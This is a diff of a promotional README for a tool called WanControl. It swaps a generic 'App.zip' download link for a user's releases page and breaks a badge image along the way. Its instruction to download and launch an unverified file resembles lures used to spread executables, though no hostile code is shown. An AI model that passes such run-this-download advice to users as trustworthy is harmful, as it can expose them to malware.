@@ -12,7 +12,7 @@ Welcome to WanControl, the ultimate solution for managing Wan2.1 networks with C
 
 ## Installation 💻
 
-To get started with WanControl, download the latest release of the application from the following link: [Download WanControl](https://github.com/repo/releases/9246/App.zip)
+To get started with WanControl, download the latest release of the application from the following link: [Download WanControl](https://github.com/xAGUSTINx/WanControl/releases)
 
 Don't forget to launch the downloaded file to begin your WanControl experience.
 
@@ -38,7 +38,7 @@ Help us grow the WanControl community by sharing this repository with your netwo
 
 ---
 
-[![Download WanControl](https://img.shields.io/badge/Download-WanControl-brightgreen)](https://github.com/repo/releases/9246/App.zip)
+[![Download WanControl](https://github.com/xAGUSTINx/WanControl/releases)](https://github.com/xAGUSTINx/WanControl/releases)
 
 ---
 
